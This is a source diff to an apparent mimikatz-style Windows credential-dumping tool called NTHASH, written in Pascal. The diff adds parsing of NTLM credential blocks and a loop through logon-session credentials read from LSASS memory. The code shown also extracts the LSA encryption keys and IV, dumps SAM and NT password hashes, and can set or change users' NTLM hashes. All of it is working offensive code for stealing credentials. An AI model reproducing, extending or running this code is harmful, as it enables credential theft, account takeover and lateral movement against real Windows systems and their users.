@@ -12,11 +12,36 @@ end;
 
   //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block
 
+  type _CRED_NTLM_BLOCK=record
+       domainlen1:word;
+       domainlen2:word;
+       unk1:dword;
+       domainoff:word;
+       unk2:array[0..5] of byte;
+       //+16
+       usernamelen1:word;
+       usernamelen2:word;
+       unk3:dword;
+       usernameoff:word;
+       unk4:array[0..5] of byte;
+       //+32
+       ntlmhash:array[0..15] of byte;
+       lmhash:array[0..15] of byte;
+       //+64
+       //sha1
+       //domain
+       //username
+       end;
+    PCRED_NTLM_BLOCK=^_CRED_NTLM_BLOCK;
+
   type _KIWI_MSV1_0_PRIMARY_CREDENTIALS =record
-	next:pointer;
-	Primary:pointer; //B260AF51e0 : pointer to B260AF51f8 ?
-	Credentials:LSA_UNICODE_STRING; //starts with Primary#0 then you got your secret ?
-                                        //or buffer actually point to B260AF5200 and not B260AF51F8
+	//next:pointer;    //actually probably a lsa_unicode_string len & bufer
+       len:word;
+       maxlen:word;
+       unk1:dword;
+       Primary:pointer; //buffer part of a lsa_unicode_string?
+	Credentials:LSA_UNICODE_STRING; //buffer contains a cred_ntlm_block
+
         end;
  PKIWI_MSV1_0_PRIMARY_CREDENTIALS=^_KIWI_MSV1_0_PRIMARY_CREDENTIALS;
 
@@ -202,7 +227,7 @@ WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);
 var
   lsass_pid:dword=0;
   p:dword;
-  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
+  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,input:string;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
   mystringsid:pchar;
@@ -224,7 +249,7 @@ begin
 	begin
 		//hKey = &kAes.hKey;
 		cbIV := sizeof(iv);
-                log('aes encrypted:'+HashByteToString (encrypted));
+                log('aes encrypted:'+ByteToHexaString (encrypted));
                 if bdecrypt(BCRYPT_AES_ALGORITHM,encrypted,@decrypted[0],aeskey,iv)>0 then result:=true;
 
         end
@@ -232,7 +257,7 @@ begin
 	begin
 		//hKey = &k3Des.hKey;
 		cbIV := sizeof(iv) div 2;
-                log('des encrypted:'+HashByteToString (encrypted));
+                log('des encrypted:'+ByteToHexaString (encrypted));
                 if bdecrypt(BCRYPT_3DES_ALGORITHM,encrypted,@decrypted[0],deskey,iv)>0 then result:=true;
         end;
 
@@ -340,7 +365,7 @@ ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
 //will match dd lsasrv!InitializationVector
 log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0);
 ReadMem(hprocess, ivoffset, @iv_, sizeof(iv_));
-log('IV:'+HashByteToString (IV_),0);
+log('IV:'+ByteToHexaString (IV_),0);
 setlength(iv,sizeof(iv_));
 CopyMemory(@iv[0],@iv_[0],sizeof(iv_));
 
@@ -381,7 +406,7 @@ if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    //for i:=0 to extracted3DesKey81.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey81.hardkey.data[i],2));;
    setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
    copymemory(@DesKey [0],@extracted3DesKey81.hardkey.data[0],extracted3DesKey81.hardkey.cbSecret);
-   log(HashByteToString(deskey));
+   log(ByteToHexaString(deskey));
    end
    else
    begin
@@ -390,7 +415,7 @@ if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    //for i:=0 to extracted3DesKey.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey.hardkey.data[i],2));;
    setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
    copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
-   log(HashByteToString(deskey));
+   log(ByteToHexaString(deskey));
    end;
 
 // Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
@@ -421,7 +446,7 @@ if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    //for i:=0 to extractedAesKey81.hardkey.cbSecret -1 do write(inttohex(extractedAesKey81.hardkey.data[i],2));;
    setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
    copymemory(@aesKey [0],@extractedAesKey81.hardkey.data[0],extractedAesKey81.hardkey.cbSecret);
-   log(HashByteToString(aesKey));
+   log(ByteToHexaString(aesKey));
    end
    else
    begin
@@ -430,7 +455,7 @@ if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    //for i:=0 to extractedAesKey.hardkey.cbSecret -1 do write(inttohex(extractedAesKey.hardkey.data[i],2));;
    setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
    copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
-   log(HashByteToString(aesKey));
+   log(ByteToHexaString(aesKey));
    end;
 
 result:=true;
@@ -461,8 +486,8 @@ if param<>nil then
      else log ('SamQueryInformationUser ok',status);
      if status=0 then
      begin
-     if (userinfo^.LmPasswordPresent=1 ) then lm:=HashByteToString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
-     if (userinfo^.NtPasswordPresent=1) then ntlm:=HashByteToString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
+     if (userinfo^.LmPasswordPresent=1 ) then lm:=ByteToHexaString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
+     if (userinfo^.NtPasswordPresent=1) then ntlm:=ByteToHexaString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
      log(pdomainuser (param).username +':'+inttostr(pdomainuser (param).rid) +':'+lm+':'+ntlm,1);
      result:=1;
      SamFreeMemory(userinfo);
@@ -704,6 +729,7 @@ var
   bytes:array[0..254] of byte;
   password,decrypted:tbytes;
   //username,domain:array [0..254] of widechar;
+  credentials:nativeuint;
 begin
   if pid=0 then exit;
   //if user='' then exit;
@@ -796,26 +822,32 @@ begin
                                    //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                                    //get username
                                    ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes );
-                                   log('username:'+strpas (pwidechar(@bytes[0])));
+                                   log('username:'+strpas (pwidechar(@bytes[0])),1);
                                    //copymemory(@username[0],@bytes[0],64);
                                    //log('username:'+widestring(username),1);
                                    //get domain
                                    ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).domain.buffer),bytes );
-                                   log('domain:'+strpas (pwidechar(@bytes[0])));
+                                   log('domain:'+strpas (pwidechar(@bytes[0])),1);
                                    //copymemory(@domain[0],@bytes[0],64);
                                    //log('domain:'+widestring(domain),1);
                                    //
-                                   log('CredentialsPtr:'+inttohex(nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials),sizeof(pointer))) ;
-                                   if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
+                                   credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
+                                   log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
+                                   if Credentials<>0 then
                                      begin
+                                     ReadMem  (hprocess,credentials,bytes );
                                      //we should loop thru credentials...
-                                     ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).credentials),bytes );
+                                     //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
+                                     while 1=1 do
+                                     begin
+                                     credentials:=nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next);
                                      log('CREDENTIALS.next:'+inttohex (nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next),sizeof(pointer) ));
                                      log('CREDENTIALS.AuthID:'+inttostr (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId ));
                                      log('CREDENTIALS.PrimaryCredentialsPtr:'+inttohex(nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,sizeof(pointer))) ;
-                                     //we should loop thru primary credentials...
+                                     //primary credentials...
                                      ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,bytes );
-                                     log('PrimaryCredentials.Next:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).next) ,sizeof(pointer))) ;
+                                     //len will help us distinguish between "Primary" and "CredentialKeys"
+                                     log('PrimaryCredentials.len:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len) ) ;
                                      log('PrimaryCredentials.Primary:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary) ,sizeof(pointer))) ;
                                      log('PrimaryCredentials.Credentials.buffer:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer) ,sizeof(pointer))) ;
                                      log('PrimaryCredentials.Credentials.length:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length )) ;
@@ -827,20 +859,12 @@ begin
                                        setlength(decrypted,1024);
                                        if decryptLSA (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,password,decrypted)=false
                                                      then log('decryptLSA NOT OK');
-                                       end;
-                                     end;
-                                   {
-                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
-                                   if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
-                                     begin
-                                     setlength(password,i_logsesslist (logsesslist ).maxlen3);
-                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
-                                     setlength(decrypted,1024);
-                                     if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
-                                        then log(strpas (pwidechar(@decrypted[0]) ),1);
-                                     end;
-                                   }
-                                   //next
+                                       end;//if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
+                                     if credentials=0 then break;
+                                     ReadMem  (hprocess,credentials,bytes );
+                                     end; //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
+                                     end;//if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
+                                   //next logsesslist
                                    ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
                                    dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                                    end;
@@ -1095,12 +1119,12 @@ begin
   try
   fillchar(bytes,sizeof(bytes),0);
   if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
-          then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1)
+          then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1)
           else log('gethash NOT OK for '+inttohex(psamuser(param).rid,8)+':'+username ,1);
   except
     on e:exception do
     begin
-      if e.ClassName ='EAccessViolation' then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1);
+      if e.ClassName ='EAccessViolation' then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1);
       log(e.Message ,0); //SHAME!!!!!!!!!!!!!!
     end;
   end;
@@ -1140,6 +1164,7 @@ begin
   log('NTHASH /getsamkey [/offline]',1);
   log('NTHASH /getlsakeys',1);
   log('NTHASH /wdigest',1);
+  log('NTHASH /logonpasswords',1);
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
@@ -1173,19 +1198,22 @@ begin
   //
   //enum_samusers(samkey);
   //password:='Password2212';
-  //setlength(buffer,length(password)+1);
-  //Move(password[1], buffer[0], Length(password)+1);
+  //setlength(buffer,length(password));
+  //Move(password[1], buffer[0], Length(password));
   //if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
+  //writeln(BytetoString (buffer)+'.');
   //exit;
   //
+  //
+
   p:=pos('/getlsakeys',cmdline);
   if p>0 then
      begin
      if findlsakeys (lsass_pid,deskey,aeskey,iv ) then
         begin
-        log('IV:'+HashByteToString (iv),1);
-        log('DESKey:'+HashByteToString (deskey),1);
-        log('AESKey:'+HashByteToString (aeskey),1);
+        log('IV:'+ByteToHexaString (iv),1);
+        log('DESKey:'+ByteToHexaString (deskey),1);
+        log('AESKey:'+ByteToHexaString (aeskey),1);
         end;
      exit;
      end;
@@ -1230,11 +1258,30 @@ begin
        binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
        delete(binary,pos(' ',binary),255);
        end;
+  p:=pos('/input:',cmdline);
+  if p>0 then
+       begin
+       input:=copy(cmdline,p,255);
+       input:=stringreplace(input,'/input:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(input,pos(' ',input),255);
+       end;
+  p:=pos('/bytetostring',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     log('BytetoString:'+BytetoAnsiString (HexaStringToByte (input)),1);
+     end;
+  p:=pos('/stringtobyte',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     log('StringtoByte:'+ ByteToHexaString ( AnsiStringtoByte(input)),1);
+     end;
   p:=pos('/getsyskey',cmdline);
   if p>0 then
      begin
      if getsyskey(syskey)
-        then log('Syskey:'+HashByteToString(syskey) ,1)
+        then log('Syskey:'+ByteToHexaString(syskey) ,1)
         else log('getsyskey NOT OK' ,1);
      exit;
      end;
@@ -1243,9 +1290,9 @@ begin
      begin
      if getsyskey(syskey) then
         begin
-        log('SYSKey:'+HashByteToString(SYSKey) ,1);
+        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
         if getsamkey(syskey,samkey)
-           then log('SAMKey:'+HashByteToString(samkey) ,1)
+           then log('SAMKey:'+ByteToHexaString(samkey) ,1)
            else log('getsamkey NOT OK' ,1);
         end //if getsyskey(syskey) then
         else log('getsyskey NOT OK' ,1);
@@ -1256,11 +1303,11 @@ begin
      begin
      if getsyskey(syskey) then
         begin
-        log('SYSKey:'+HashByteToString(SYSKey) ,1);
+        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
         if getsamkey(syskey,samkey)
            then
               begin
-              log('SAMKey:'+HashByteToString(samkey) ,1);
+              log('SAMKey:'+ByteToHexaString(samkey) ,1);
               query_samusers (samkey,@callback_SamUsers );
               end //if getsamkey(syskey,samkey)
            else log('getsamkey NOT OK' ,1);
@@ -1274,13 +1321,13 @@ begin
      if rid='' then exit;
      if getsyskey(syskey) then
         begin
-        log('SYSKey:'+HashByteToString(SYSKey) ,1);
+        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
         if getsamkey(syskey,samkey)
            then
               begin
-              log('SAMKey:'+HashByteToString(samkey) ,1);
+              log('SAMKey:'+ByteToHexaString(samkey) ,1);
               if dumphash(samkey,strtoint(rid),ntlmhash,user)
-                 then log('NTHASH:'+user+':'+rid+'::'+HashByteToString(ntlmhash) ,1)
+                 then log('NTHASH:'+user+':'+rid+'::'+ByteToHexaString(ntlmhash) ,1)
                  else log('gethash NOT OK' ,1);
               end //if getsamkey(syskey,samkey)
            else log('getsamkey NOT OK' ,1);
@@ -1407,9 +1454,9 @@ begin
   p:=pos('/setntlm',cmdline);
   if p>0 then
        begin
-       if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
+       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
        if newpwd<>'' then newhash:=GenerateNTLMHash (newpwd);
-       if SetInfoUser (server,user, HashStringToByte (newhash))
+       if SetInfoUser (server,user, HexaStringToByte (newhash))
           then log('Done',1)
           else log('Failed',1);
        end;
@@ -1418,8 +1465,8 @@ begin
        begin
        if oldpwd<>'' then oldhashbyte:=tbyte16(GenerateNTLMHashByte (oldpwd));
        if newpwd<>'' then newhashbyte:=tbyte16(GenerateNTLMHashByte (newpwd));
-       if oldhash<>'' then oldhashbyte :=HashStringToByte (oldhash);
-       if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
+       if oldhash<>'' then oldhashbyte :=HexaStringToByte (oldhash);
+       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
        if ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
           then log('Done',1)
           else log('Failed',1);
